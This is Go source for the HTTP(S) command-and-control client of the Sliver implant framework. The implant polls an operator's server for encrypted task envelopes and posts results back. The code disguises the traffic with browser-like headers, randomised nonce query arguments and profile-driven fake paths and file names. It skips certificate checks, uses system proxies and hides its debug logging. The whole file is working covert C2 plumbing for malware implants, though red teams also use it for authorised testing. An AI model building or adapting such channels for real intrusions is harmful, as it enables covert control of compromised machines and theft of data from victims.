package httpclient

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.HTTPc2Enabled}}

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"bytes"
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	insecureRand "math/rand"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"google.golang.org/protobuf/proto"

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	"github.com/bishopfox/sliver/implant/sliver/encoders"
	"github.com/bishopfox/sliver/implant/sliver/proxy"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

const (
	nonceQueryArgs    = "abcdefghijklmnopqrstuvwxyz_"
	acceptHeaderValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
)

var (
	ErrClosed               = errors.New("http session closed")
	ErrStatusCodeUnexpected = errors.New("unexpected http response code")
)

// StartSessionHTTP - Attempts to start an HTTP session with a given address, with no TLS setup.
// The Channel datastream is still encrypted by the Channel core cryptosystem.
func StartSessionHTTP(c2URI *url.URL, profile *sliverpb.Malleable) (*SliverHTTPClient, error) {

	address := c2URI.Host
	pathPrefix := c2URI.Path
	proxyConfig := c2URI.Query().Get("proxy")
	timeout := time.Duration(profile.PollTimeout)
	fmt.Printf("Poll timeout: %s\n", timeout)

	// Create and provision the client with the complete
	// HTTP C2 profile (all extensions paths and files)
	var client *SliverHTTPClient
	client = httpClient(address, timeout, proxyConfig)
	client.profile = profile.HTTP
	client.PathPrefix = pathPrefix

	// Start the client session
	err := client.SessionInit()
	if err != nil {
		return nil, err
	}
	return client, nil
}

// StartSessionHTTPS - Start an HTTP Session with either mutual TLS authentication or LetsEncrypt.
// The LetsEncrypt option simply means dialing with a TLS insecure config, and the server handles the rest.
func StartSessionHTTPS(c2URI *url.URL, profile *sliverpb.Malleable) (*SliverHTTPClient, error) {

	address := c2URI.Host
	pathPrefix := c2URI.Path
	proxyConfig := c2URI.Query().Get("proxy")
	timeout := time.Duration(profile.PollTimeout)
	fmt.Printf("Poll timeout: %s\n", timeout)

	// Generate the TLS configuration, either mutually authenticated or with LetsEncrypt
	var tlsConfig *tls.Config
	if profile.LetsEncrypt {
		tlsConfig = &tls.Config{InsecureSkipVerify: true} // Trust LetsEncrypt server certificates
	} else {
		tlsConfig = cryptography.NewCredentialsTLS(profile.Credentials.CACertPEM,
			profile.Credentials.CertPEM,
			profile.Credentials.KeyPEM).ClientConfig(c2URI.Hostname())
		if tlsConfig == nil {
			// {{if .Config.Debug}}
			log.Printf("NO TLS CONFIG")
			// {{end}}
			return nil, errors.New("No TLS config")
		}
	}

	// Create and provision the client with the complete
	// HTTP C2 profile (all extensions paths and files)
	var client *SliverHTTPClient
	client = httpsClient(address, timeout, proxyConfig, tlsConfig)
	client.profile = profile.HTTP
	client.PathPrefix = pathPrefix

	// Start the client session
	err := client.SessionInit()
	if err != nil {
		return nil, err
	}

	return client, nil
}

// SliverHTTPClient - Helper struct to keep everything together.
// This client implements the Beacon interface, in beacon.go
type SliverHTTPClient struct {
	Origin     string
	PathPrefix string
	Client     *http.Client
	ProxyURL   string
	SessionCtx *cryptography.CipherContext
	SessionID  string
	pollCancel context.CancelFunc
	pollMutex  *sync.Mutex
	Closed     bool

	// Operating parameters
	uri     *url.URL
	profile *sliverpb.MalleableHTTP // We can use on-demand HTTP profiles
}

// SessionInit - Initialize the session
func (s *SliverHTTPClient) SessionInit() error {
	sKey := cryptography.RandomKey()
	s.SessionCtx = cryptography.NewCipherContext(sKey)
	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:]}
	data, _ := proto.Marshal(httpSessionInit)

	encryptedSessionInit, err := cryptography.ECCEncryptToServer(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Nacl encrypt failed %v", err)
		// {{end}}
		return err
	}
	err = s.getSessionID(encryptedSessionInit)
	if err != nil {
		return err
	}
	return nil
}

// NonceQueryArgument - Adds a nonce query argument to the URL
func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value int) *url.URL {
	values := uri.Query()
	key := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
	argValue := fmt.Sprintf("%d", value)
	for i := 0; i < insecureRand.Intn(3); i++ {
		index := insecureRand.Intn(len(argValue))
		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
		argValue = argValue[:index] + char + argValue[index:]
	}
	values.Add(string(key), argValue)
	uri.RawQuery = values.Encode()
	return uri
}

// OTPQueryArgument - Adds an OTP query argument to the URL
func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL {
	values := uri.Query()
	key1 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
	key2 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
	for i := 0; i < insecureRand.Intn(3); i++ {
		index := insecureRand.Intn(len(value))
		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
		value = value[:index] + char + value[index:]
	}
	values.Add(string([]byte{key1, key2}), value)
	uri.RawQuery = values.Encode()
	return uri
}

func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.Reader) *http.Request {
	req, _ := http.NewRequest(method, uri.String(), body)
	req.Header.Set("User-Agent", s.profile.UserAgent)
	if method == http.MethodGet {
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
		req.Header.Set("Accept", acceptHeaderValue)
	}
	if uri.Scheme == "http" {
		req.Header.Set("Upgrade-Insecure-Requests", "1")
	}
	return req
}

// Do - Wraps http.Client.Do with a context
func (s *SliverHTTPClient) DoPoll(req *http.Request) (*http.Response, error) {
	ctx, cancel := context.WithCancel(req.Context())
	s.pollCancel = cancel
	defer func() {
		s.pollMutex.Lock()
		defer s.pollMutex.Unlock()
		if s.pollCancel != nil {
			s.pollCancel()
		}
		s.pollCancel = nil
	}()
	done := make(chan error)
	var resp *http.Response
	var err error
	go func() {
		resp, err = s.Client.Do(req.WithContext(ctx))
		select {
		case <-ctx.Done():
			done <- ctx.Err()
		default:
			done <- err
		}
	}()
	return resp, <-done
}

// We do our own POST here because the server doesn't have the
// session key yet.
func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
	nonce, encoder := encoders.RandomEncoder()
	payload := encoder.Encode(sessionInit)
	reqBody := bytes.NewReader(payload) // Already RSA encrypted

	uri := s.startSessionURL()
	s.NonceQueryArgument(uri, nonce)
	otpCode := cryptography.GetOTPCode()
	s.OTPQueryArgument(uri, otpCode)
	req := s.newHTTPRequest(http.MethodPost, uri, reqBody)
	// {{if .Config.Debug}}
	log.Printf("[http] POST -> %s (%d bytes)", uri, len(sessionInit))
	// {{end}}

	resp, err := s.Client.Do(req)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] http response error: %s", err)
		// {{end}}
		return err
	}
	if resp.StatusCode != 200 {
		// {{if .Config.Debug}}
		log.Printf("[http] non-200 response (%d): %v", resp.StatusCode, resp)
		// {{end}}
		return errors.New("send failed")
	}
	respData, _ := ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	data, err := encoder.Decode(respData)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] response decoder failure: %s", err)
		// {{end}}
		return err
	}
	sessionID, err := s.SessionCtx.Decrypt(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] response decrypt failure: %s", err)
		// {{end}}
		return err
	}
	s.SessionID = string(sessionID)
	// {{if .Config.Debug}}
	log.Printf("[http] New session id: %v", s.SessionID)
	// {{end}}
	return nil
}

// ReadEnvelope - Perform an HTTP GET request
func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
	if s.Closed {
		return nil, ErrClosed
	}
	if s.SessionID == "" {
		return nil, errors.New("no session")
	}
	uri := s.pollURL()
	nonce, encoder := encoders.RandomEncoder()
	s.NonceQueryArgument(uri, nonce)
	req := s.newHTTPRequest(http.MethodGet, uri, nil)
	// {{if .Config.Debug}}
	log.Printf("[http] GET -> %s", uri)
	// {{end}}
	resp, err := s.DoPoll(req)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] GET failed %v", err)
		// {{end}}
		return nil, err
	}
	if resp.StatusCode == http.StatusForbidden {
		// {{if .Config.Debug}}
		log.Printf("Server responded with invalid session for %v", s.SessionID)
		// {{end}}
		return nil, errors.New("invalid session")
	}
	if resp.StatusCode == http.StatusNoContent {
		return nil, nil
	}
	if resp.StatusCode == http.StatusOK {
		var data []byte
		respData, _ := ioutil.ReadAll(resp.Body)
		defer resp.Body.Close()
		if 0 < len(respData) {
			data, err = encoder.Decode(respData)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("Decoding failed %s", err)
				// {{end}}
				return nil, err
			}
		}
		data, err := s.SessionCtx.Decrypt(data)
		if err != nil {
			return nil, err
		}
		envelope := &pb.Envelope{}
		err = proto.Unmarshal(data, envelope)
		if err != nil {
			return nil, err
		}
		return envelope, nil
	}

	// {{if .Config.Debug}}
	log.Printf("[http] Unexpected status code %v", resp)
	// {{end}}
	return nil, ErrStatusCodeUnexpected
}

// WriteEnvelope - Perform an HTTP POST request
func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
	if s.Closed {
		return ErrClosed
	}
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] failed to encode request: %s", err)
		// {{end}}
		return err
	}
	if s.SessionID == "" {
		return errors.New("no session")
	}
	reqData, err := s.SessionCtx.Encrypt(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] failed to encrypt request: %s", err)
		// {{end}}
		return err
	}

	uri := s.sessionURL()
	nonce, encoder := encoders.RandomEncoder()
	s.NonceQueryArgument(uri, nonce)
	reader := bytes.NewReader(encoder.Encode(reqData))

	// {{if .Config.Debug}}
	log.Printf("[http] POST -> %s (%d bytes)", uri, len(reqData))
	// {{end}}

	req := s.newHTTPRequest(http.MethodPost, uri, reader)
	resp, err := s.Client.Do(req)
	// {{if .Config.Debug}}
	log.Printf("[http] POST request completed")
	// {{end}}
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] request failed %v", err)
		// {{end}}
		return err
	}
	if resp.StatusCode != 202 {
		// {{if .Config.Debug}}
		log.Printf("[http] non-202 response (%d): %v", resp.StatusCode, resp)
		// {{end}}
		return errors.New("{{if .Config.Debug}}HTTP send failed (non-200 resp){{end}}")
	}
	return nil
}

func (s *SliverHTTPClient) CloseSession() error {
	if s.Closed {
		return nil
	}
	if s.SessionID == "" {
		return errors.New("no session")
	}
	s.Closed = true

	// Cancel any pending poll request
	s.pollMutex.Lock()
	defer s.pollMutex.Unlock()
	if s.pollCancel != nil {
		s.pollCancel()
	}
	s.pollCancel = nil

	// Tell server session is closed
	uri := s.closeURL()
	nonce, _ := encoders.RandomEncoder()
	s.NonceQueryArgument(uri, nonce)
	req := s.newHTTPRequest(http.MethodGet, uri, nil)
	// {{if .Config.Debug}}
	log.Printf("[http] GET -> %s", uri)
	// {{end}}
	resp, err := s.Client.Do(req)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] GET failed %v", err)
		// {{end}}
		return err
	}
	if resp.StatusCode != 202 {
		// {{if .Config.Debug}}
		log.Printf("[http] non-202 response (%d): %v", resp.StatusCode, resp)
		// {{end}}
		return errors.New("{{if .Config.Debug}}HTTP close failed (non-200 resp){{end}}")
	}
	// {{if .Config.Debug}}
	log.Printf("[http] session closed")
	// {{end}}
	return nil
}

func (s *SliverHTTPClient) pathJoinURL(segments []string) string {
	for index, segment := range segments {
		segments[index] = url.PathEscape(segment)
	}
	if s.PathPrefix != "" {
		segments = append([]string{s.PathPrefix}, segments...)
	}
	return strings.Join(segments, "/")
}

func (s *SliverHTTPClient) keyExchangeURL() *url.URL {
	curl, _ := url.Parse(s.Origin)
	segments := s.profile.KeyExchangePaths
	filenames := s.profile.KeyExchangeFiles
	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, s.profile.KeyExchangeFileExt))
	return curl
}

func (s *SliverHTTPClient) pollURL() *url.URL {
	curl, _ := url.Parse(s.Origin)

	segments := s.profile.PollPaths
	filenames := s.profile.PollFiles

	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, s.profile.PollFileExt))
	return curl
}

func (s *SliverHTTPClient) startSessionURL() *url.URL {
	sessionURI := s.sessionURL()
	uri := strings.TrimSuffix(sessionURI.String(), s.profile.SessionFileExt)
	uri += s.profile.StartSessionFileExt
	curl, _ := url.Parse(uri)
	return curl
}

func (s *SliverHTTPClient) sessionURL() *url.URL {
	curl, _ := url.Parse(s.Origin)
	segments := s.profile.SessionPaths
	filenames := s.profile.SessionFiles
	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, s.profile.SessionFileExt))
	return curl
}

func (s *SliverHTTPClient) closeURL() *url.URL {
	curl, _ := url.Parse(s.Origin)

	segments := s.profile.ClosePaths
	filenames := s.profile.CloseFiles
	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, s.profile.CloseFileExt))
	return curl
}

// Must return at least a file name, path segments are optional
func (s *SliverHTTPClient) randomPath(segments []string, filenames []string, ext string) []string {
	genSegments := []string{}
	if 0 < len(segments) {
		n := insecureRand.Intn(len(segments)) // How many segments?
		for index := 0; index < n; index++ {
			seg := segments[insecureRand.Intn(len(segments))]
			genSegments = append(genSegments, seg)
		}
	}
	filename := filenames[insecureRand.Intn(len(filenames))]

	// {{if .Config.Debug}}
	log.Printf("[http] segments = %v, filename = %s, ext = %s", genSegments, filename, ext)
	// {{end}}
	genSegments = append(genSegments, fmt.Sprintf("%s.%s", filename, ext))
	return genSegments
}

// [ HTTP(S) Clients ] ------------------------------------------------------------

func httpClient(address string, timeout time.Duration, proxyConfig string) *SliverHTTPClient {
	transport := &http.Transport{
		Dial:                proxy.Direct.Dial,
		TLSHandshakeTimeout: timeout,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
	}
	client := &SliverHTTPClient{
		Origin: fmt.Sprintf("http://%s", address),
		Client: &http.Client{
			Jar:       cookieJar(),
			Timeout:   timeout,
			Transport: transport,
		},
	}
	parseProxyConfig(client, transport, proxyConfig)
	return client
}

func httpsClient(address string, timeout time.Duration, proxyConfig string, tlsConfig *tls.Config) *SliverHTTPClient {
	transport := &http.Transport{
		Dial: (&net.Dialer{
			Timeout: timeout,
		}).Dial,
		TLSHandshakeTimeout: timeout,
		TLSClientConfig:     tlsConfig, // Mutually authenticated TLS or LetsEncrypt
	}
	client := &SliverHTTPClient{
		Origin: fmt.Sprintf("https://%s", address),
		Client: &http.Client{
			Jar:       cookieJar(),
			Timeout:   timeout,
			Transport: transport,
		},
	}
	parseProxyConfig(client, transport, proxyConfig)
	return client
}

func parseProxyConfig(client *SliverHTTPClient, transport *http.Transport, proxyConfig string) {
	switch proxyConfig {
	case "never":
		break
	case "":
		fallthrough
	case "auto":
		p := proxy.NewProvider("").GetHTTPSProxy(client.Origin)
		if p != nil {
			// {{if .Config.Debug}}
			log.Printf("Found proxy %#v\n", p)
			// {{end}}
			proxyURL := p.URL()
			if proxyURL.Scheme == "" {
				proxyURL.Scheme = "https"
			}
			// {{if .Config.Debug}}
			log.Printf("Proxy URL = '%s'\n", proxyURL)
			// {{end}}
			transport.Proxy = http.ProxyURL(proxyURL)
			client.ProxyURL = proxyURL.String()
		}
	default:
		// {{if .Config.Debug}}
		log.Printf("Force proxy %#v\n", proxyConfig)
		// {{end}}
		proxyURL, err := url.Parse(proxyConfig)
		if err != nil {
			break
		}
		if proxyURL.Scheme == "" {
			proxyURL.Scheme = "https"
		}
		// {{if .Config.Debug}}
		log.Printf("Proxy URL = '%s'\n", proxyURL)
		// {{end}}
		transport.Proxy = http.ProxyURL(proxyURL)
		client.ProxyURL = proxyURL.String()
	}
}

// Jar - CookieJar implementation that ignores domains/origins
type Jar struct {
	lk      sync.Mutex
	cookies []*http.Cookie
}

func cookieJar() *Jar {
	return &Jar{
		lk:      sync.Mutex{},
		cookies: []*http.Cookie{},
	}
}

// NewJar - Get a new instance of a cookie jar
func NewJar() *Jar {
	jar := new(Jar)
	jar.cookies = make([]*http.Cookie, 0)
	return jar
}

// SetCookies handles the receipt of the cookies in a reply for the
// given URL (which is ignored).
func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
	jar.lk.Lock()
	jar.cookies = append(jar.cookies, cookies...)
	jar.lk.Unlock()
}

// Cookies returns the cookies to send in a request for the given URL.
// It is up to the implementation to honor the standard cookie use
// restrictions such as in RFC 6265 (which we do not).
func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
	return jar.cookies
}

// {{end}} -HTTPc2Enabled
